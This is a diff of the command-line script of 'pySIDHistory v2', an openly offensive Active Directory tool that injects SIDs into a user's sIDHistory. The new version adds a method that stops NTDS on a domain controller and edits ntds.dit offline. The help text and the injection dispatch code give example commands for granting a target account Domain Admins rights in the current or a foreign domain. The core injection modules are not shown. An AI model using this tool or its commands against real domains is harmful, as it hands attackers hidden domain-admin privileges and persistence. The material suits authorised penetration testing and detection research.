@@ -1,9 +1,9 @@
 #!/usr/bin/env python3
 """
-pySIDHistory - Remote SID History Attack & Audit Tool
+pySIDHistory v2 - Remote SID History Attack & Audit Tool
 
-The first tool to perform SID History injection from a distant
-UNIX-like machine, combining LDAP and DRSUAPI (MS-DRSR opnum 20).
+v2 adds DSInternals-based injection for privileged SIDs (Domain Admins, etc.)
+that cannot be injected via DRSUAPI DRSAddSidHistory.
 
 Author: @felixbillieres
 License: MIT
@@ -19,25 +19,31 @@ from core.output import OutputFormatter
 
 
 BANNER = r"""
-             _____  _____ ____  _   _ _     _
- _ __  _   _/ ____| |_ _||  _ \| | | (_)___| |_ ___  _ __ _   _
-| '_ \| | | \___ \   | | | | | | |_| | / __| __/ _ \| '__| | | |
-| |_) | |_| |___) |  | | | |_| |  _  | \__ \ || (_) | |  | |_| |
-| .__/ \__, |____/  |___| |____/|_| |_|_|___/\__\___/|_|   \__, |
-|_|    |___/                                                |___/
-        Remote SID History Attack & Audit Tool
-                                        @felixbillieres
+             _____ _____ ____  _   _ _     _
+ _ __  _   _/ ___||_ _||  _ \| | | (_)___| |_ ___  _ __ _   _
+| '_ \| | | \___ \ | | | | | | |_| | / __| __/ _ \| '__| | | |
+| |_) | |_| |___) || | | |_| |  _  | \__ \ || (_) | |  | |_| |
+| .__/ \__, |____/|___||____/|_| |_|_|___/\__\___/|_|   \__, |
+|_|    |___/                                             |___/
+    Remote SID History Injection & Audit Tool  v2
+    DSInternals + DRSUAPI | github.com/felixbillieres
+                                      @felixbillieres
 """
 
 
 def setup_logging(verbose: bool = False, quiet: bool = False):
-    """Configure logging."""
+    """Configure logging.
+
+    Default: only errors (clean output via print statements).
+    -v:      DEBUG level, shows full LDAP/SMB/RPC trace.
+    -q:      suppress everything except critical errors.
+    """
     if quiet:
         level = logging.CRITICAL
     elif verbose:
         level = logging.DEBUG
     else:
-        level = logging.WARNING
+        level = logging.ERROR
 
     logging.basicConfig(
         level=level,
@@ -49,33 +55,41 @@ def setup_logging(verbose: bool = False, quiet: bool = False):
 def build_parser():
     """Build the argument parser."""
     parser = argparse.ArgumentParser(
-        description='pySIDHistory - Remote SID History Attack & Audit Tool',
+        description='pySIDHistory v2 - Remote SID History Attack & Audit Tool',
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
 MODES:
-  Inject:  Inject SID via DRSUAPI (--target + --source-user + --source-domain)
-  Query:   Query sIDHistory of an object (--query)
-  Lookup:  Lookup SID of an object (--lookup)
-  Audit:   Full domain sIDHistory audit (--audit)
-  Trusts:  Enumerate domain trusts (--enum-trusts)
-  Presets: List well-known SID presets (--list-presets)
-
-INJECTION:
-  Uses DRSUAPI DRSAddSidHistory (opnum 20) — the same RPC call that
-  Microsoft's ADMT uses for domain migrations. Requires cross-forest
-  trust, auditing enabled on both DCs, and source domain credentials.
+  Inject (DSInternals): Inject privileged SID via DSInternals (--target + --inject)
+  Inject (DRSUAPI):     Inject SID via DRSUAPI (--target + --method drsuapi + --source-user)
+  Query:                Query sIDHistory of an object (--query)
+  Lookup:               Lookup SID of an object (--lookup)
+  Audit:                Full domain sIDHistory audit (--audit)
+  Trusts:               Enumerate domain trusts (--enum-trusts)
+  Presets:              List well-known SID presets (--list-presets)
 
 EXAMPLES:
-  # Cross-forest SID injection via DRSUAPI
-  %(prog)s -d DST.LOCAL -u admin -p Pass123 -dc 10.0.0.1 \\
-      --target victim --source-user admin --source-domain SRC.LOCAL \\
+  # Inject Domain Admins of current domain via DSInternals
+  %(prog)s -d LAB1.LOCAL -u da-admin -p 'Pass123!' --dc-ip 10.0.0.1 \\
+      --target user1 --inject domain-admins
+
+  # Inject Domain Admins of a FOREIGN domain via DSInternals
+  %(prog)s -d LAB1.LOCAL -u da-admin -p 'Pass123!' --dc-ip 10.0.0.1 \\
+      --target user1 --inject domain-admins --inject-domain LAB2.LOCAL
+
+  # Inject arbitrary SID via DSInternals
+  %(prog)s -d LAB1.LOCAL -u da-admin -p 'Pass123!' --dc-ip 10.0.0.1 \\
+      --target user1 --inject S-1-5-21-3522073385-2671856591-2684624930-512
+
+  # Cross-forest SID injection via DRSUAPI (legacy v1 method)
+  %(prog)s -d DST.LOCAL -u admin -p Pass123 --dc-ip 10.0.0.1 \\
+      --target victim --method drsuapi --source-user admin --source-domain SRC.LOCAL \\
       --src-username admin --src-password Pass123 --src-domain SRC.LOCAL
 
   # Full domain audit
-  %(prog)s -d CORP.LOCAL -u admin -p Pass123 -dc 10.0.0.1 --audit
+  %(prog)s -d CORP.LOCAL -u admin -p Pass123 --dc-ip 10.0.0.1 --audit
 
   # Query a user's sIDHistory
-  %(prog)s -d CORP.LOCAL -u admin -p Pass123 -dc 10.0.0.1 --query victim
+  %(prog)s -d CORP.LOCAL -u admin -p Pass123 --dc-ip 10.0.0.1 --query victim
         """
     )
 
@@ -112,8 +126,17 @@ EXAMPLES:
     action_grp.add_argument('--enum-trusts', action='store_true', help='Enumerate domain trusts')
     action_grp.add_argument('--list-presets', action='store_true', help='List available SID presets')
 
-    # ── Injection options ──
-    mods = parser.add_argument_group('Injection options (with --target)')
+    # ── Injection options (v2: DSInternals) ──
+    inject_opts = parser.add_argument_group('Injection options (with --target)')
+    inject_opts.add_argument('--inject', help='SID or preset to inject (e.g., domain-admins, S-1-5-21-...-512)')
+    inject_opts.add_argument('--inject-domain', help='Foreign domain for preset resolution (e.g., LAB2.LOCAL)')
+    inject_opts.add_argument('--method', choices=['dsinternals', 'drsuapi'], default='dsinternals',
+                             help='Injection method (default: dsinternals)')
+    inject_opts.add_argument('--dsinternals-path', help='Path to DSInternals module on the DC (if no internet)')
+    inject_opts.add_argument('--force', action='store_true', help='Skip confirmation warning before injection')
+
+    # ── DRSUAPI legacy options (with --method drsuapi) ──
+    mods = parser.add_argument_group('DRSUAPI options (with --method drsuapi)')
     mods.add_argument('--source-user', help='Source user whose SID to inject (via DRSUAPI)')
     mods.add_argument('--source-domain', help='Source domain (cross-forest injection)')
 
@@ -132,8 +155,8 @@ EXAMPLES:
 
     # ── Other ──
     other = parser.add_argument_group('Other')
-    other.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
-    other.add_argument('-q', '--quiet', action='store_true', help='Quiet (warnings/errors only)')
+    other.add_argument('-v', '--verbose', action='store_true', help='Full debug output (LDAP, SMB, RPC, SCMR traces)')
+    other.add_argument('-q', '--quiet', action='store_true', help='Suppress all output except critical errors')
     other.add_argument('--dry-run', action='store_true', help='Show what would be done without modifying')
     other.add_argument('--no-banner', action='store_true', help='Suppress banner')
 
@@ -173,11 +196,17 @@ def validate_arguments(args, auth_method: str, parser) -> bool:
 
     # Target action validation
     if args.target:
-        if not args.source_user:
-            parser.error("--target requires --source-user and --source-domain for DRSUAPI injection")
+        method = args.method
 
-        if args.source_user and not args.source_domain:
-            parser.error("--source-user requires --source-domain (DRSAddSidHistory is cross-forest only)")
+        if method == 'dsinternals':
+            if not args.inject:
+                parser.error("--target with --method dsinternals (default) requires --inject")
+
+        elif method == 'drsuapi':
+            if not args.source_user:
+                parser.error("--target with --method drsuapi requires --source-user and --source-domain")
+            if args.source_user and not args.source_domain:
+                parser.error("--source-user requires --source-domain (DRSAddSidHistory is cross-forest only)")
 
     return True
 
@@ -222,7 +251,7 @@ def handle_audit(attacker: SIDHistoryAttack, formatter: OutputFormatter):
     if report:
         print(formatter.format_audit_report(report))
     else:
-        logging.error("Audit failed")
+        print("[-] Audit failed", file=sys.stderr)
 
 
 def handle_trusts(attacker: SIDHistoryAttack, formatter: OutputFormatter):
@@ -242,27 +271,76 @@ def handle_presets(attacker: SIDHistoryAttack, formatter: OutputFormatter):
 
 def handle_target(attacker: SIDHistoryAttack, formatter: OutputFormatter,
                   args, dry_run: bool = False) -> bool:
-    """Handle --target action (DRSUAPI injection)."""
+    """Handle --target action (injection dispatch)."""
     target = args.target
+    method = args.method
 
-    if dry_run:
-        source_sid = attacker.get_user_sid(args.source_user)
-        print(f"[DRY-RUN] Would inject SID of {args.source_user}@{args.source_domain} into {target}")
-        if source_sid:
-            print(f"[DRY-RUN] Source SID: {source_sid}")
-        print(f"[DRY-RUN] Method: DRSUAPI (DRSAddSidHistory opnum 20)")
-        return True
+    if method == 'dsinternals':
+        # DSInternals injection path
+        if dry_run:
+            sid = attacker.resolve_inject_sid(args.inject, args.inject_domain)
+            print(f"[DRY-RUN] Would inject SID {sid or args.inject} into {target}")
+            print(f"[DRY-RUN] Method: DSInternals (offline ntds.dit modification)")
+            if args.inject_domain:
+                print(f"[DRY-RUN] Source domain: {args.inject_domain}")
+            return True
 
-    src_creds_user = getattr(args, 'src_username', '') or ''
-    src_creds_password = getattr(args, 'src_password', '') or ''
-    src_creds_domain = getattr(args, 'src_domain', '') or args.source_domain or ''
-    success = attacker.inject_sid_history(
-        target, args.source_user,
-        source_domain=args.source_domain,
-        src_creds_user=src_creds_user,
-        src_creds_domain=src_creds_domain,
-        src_creds_password=src_creds_password,
-    )
+        # Interactive warning before injection
+        if not args.force:
+            print("\n" + "=" * 60)
+            print("  WARNING: DSInternals SID History Injection")
+            print("=" * 60)
+            print(f"  Target:  {target}")
+            print(f"  Inject:  {args.inject}")
+            if args.inject_domain:
+                print(f"  Domain:  {args.inject_domain}")
+            print(f"  DC:      {args.dc_ip}")
+            print()
+            print("  This will STOP the NTDS service on the DC,")
+            print("  modify ntds.dit offline, then RESTART NTDS.")
+            print("  The DC will be briefly unavailable.")
+            print("=" * 60)
+            try:
+                answer = input("\n  Proceed? [y/N] ").strip().lower()
+                if answer not in ('y', 'yes'):
+                    print("Aborted.")
+                    return False
+            except (EOFError, KeyboardInterrupt):
+                print("\nAborted.")
+                return False
+
+        success = attacker.inject_sid_history(
+            target, method='dsinternals',
+            inject_value=args.inject,
+            inject_domain=args.inject_domain,
+            dsinternals_path=args.dsinternals_path,
+        )
+
+    elif method == 'drsuapi':
+        # DRSUAPI legacy path
+        if dry_run:
+            source_sid = attacker.get_user_sid(args.source_user)
+            print(f"[DRY-RUN] Would inject SID of {args.source_user}@{args.source_domain} into {target}")
+            if source_sid:
+                print(f"[DRY-RUN] Source SID: {source_sid}")
+            print(f"[DRY-RUN] Method: DRSUAPI (DRSAddSidHistory opnum 20)")
+            return True
+
+        src_creds_user = getattr(args, 'src_username', '') or ''
+        src_creds_password = getattr(args, 'src_password', '') or ''
+        src_creds_domain = getattr(args, 'src_domain', '') or args.source_domain or ''
+
+        success = attacker.inject_sid_history(
+            target, method='drsuapi',
+            source_user=args.source_user,
+            source_domain=args.source_domain,
+            src_creds_user=src_creds_user,
+            src_creds_domain=src_creds_domain,
+            src_creds_password=src_creds_password,
+        )
+    else:
+        logging.error(f"Unknown method: {method}")
+        return False
 
     if success:
         print(f"\n[+] sIDHistory modified successfully")
@@ -287,11 +365,6 @@ def main():
     auth_method = determine_auth_method(args)
     validate_arguments(args, auth_method, parser)
 
-    # Handle --list-presets without auth (just needs domain SID format)
-    if args.list_presets:
-        # Still need to connect to get domain SID
-        pass
-
     # Initialize
     attacker = SIDHistoryAttack(
         dc_ip=args.dc_ip,
@@ -302,7 +375,7 @@ def main():
     # Authenticate
     auth_params = build_auth_params(args, auth_method)
     if not attacker.authenticate(auth_method, **auth_params):
-        logging.error("Authentication failed")
+        print("[-] Authentication failed", file=sys.stderr)
         sys.exit(1)
 
     # Setup formatter
@@ -317,7 +390,6 @@ def main():
     if args.output_file:
         try:
             output_file = open(args.output_file, 'w')
-            # Redirect print to file
             import builtins
             original_print = builtins.print
             def file_print(*a, **kw):
@@ -349,10 +421,10 @@ def main():
             sys.exit(0 if success else 1)
 
     except KeyboardInterrupt:
-        logging.info("\nCancelled by user")
+        print("\n[!] Cancelled by user", file=sys.stderr)
         sys.exit(130)
     except Exception as e:
-        logging.error(f"Error: {e}")
+        print(f"[-] Error: {e}", file=sys.stderr)
         if args.verbose:
             import traceback
             traceback.print_exc()
